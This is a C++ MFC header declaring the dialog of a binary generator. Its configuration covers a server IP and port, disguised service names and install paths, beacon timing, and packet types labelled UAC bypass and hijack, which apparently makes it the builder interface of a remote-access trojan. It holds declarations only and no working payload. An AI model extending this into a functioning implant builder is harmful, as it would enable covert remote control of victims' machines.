
// Generate_binDlg.h : 头文件
//

#pragma once
#include "afxwin.h"

enum
{
	PACKET_TYPE_SETUP = 0,
	PACKET_TYPE_PASSUAC,
	PACKET_TYPE_HIJACK
};

enum
{
	SETUP_TYPE_CHAMELEON = 0,
	SETUP_TYPE_SPECIFIED
};

// CGenerate_binDlg 对话框
class CGeneratorDlg : public CDialogEx
{
// 构造
public:
	CGeneratorDlg(CWnd* pParent = NULL);	// 标准构造函数

// 对话框数据
	enum { IDD = IDD_GENERATE_BIN_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	void InitDlgEdit();
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()

private:
	typedef struct  
	{
		CString	serverIP;
		CString serviceName;
		CString serviceDisplayName;
		CString serviceDescription;
		CString serviceInstallpath;
		int		port;
		int		commType;
		int		setupType;
		int		connectTryIntervalM;
		int		firstConnectHour;
		int		firstConnectMinute;
		int		downSvtOffsetS;
		int		downSvtIntervalS;
		int		packetType;
	} GENERATOR_CONFIG;

	GENERATOR_CONFIG config;

private:
	CComboBox m_ConnectType;
	CComboBox m_ProxyType;
	CComboBox m_DefaultComm;
	CComboBox m_SetupType;

private:
	void SaveGeneratorConfig(const GENERATOR_CONFIG& config);
	void LoadGeneratorConfig(GENERATOR_CONFIG& config);

	afx_msg void OnBnClickedButtonBingo();
	afx_msg void OnBnClickedButtonClose();
	afx_msg void OnBnClickedRadioPassuac();
	afx_msg void OnBnClickedRadioHijack();
	afx_msg void OnBnClickedRadioSetup();
	afx_msg void OnCbnSelchangeComboSetupType();
public:
	afx_msg void OnCbnSelendokComboComm();
};
